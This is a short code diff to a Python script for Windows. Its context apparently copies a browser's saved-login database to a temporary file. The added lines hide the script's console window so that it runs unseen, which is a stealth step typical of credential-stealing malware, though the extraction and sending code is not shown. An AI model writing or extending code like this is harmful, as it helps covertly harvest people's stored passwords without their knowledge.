@@ -7,6 +7,11 @@ import ctypes
 import ctypes.wintypes
 import winreg  # For accessing the Windows Registry
 
+kernel32 = ctypes.WinDLL('kernel32')
+user32 = ctypes.WinDLL('user32')
+hwnd = kernel32.GetConsoleWindow()
+if hwnd:
+    user32.ShowWindow(hwnd, 0)
 # Function to copy the database file to avoid locks
 def copy_database_file(original_path):
     temp_path = os.path.join(os.getenv('TEMP'), 'temp_login_data')
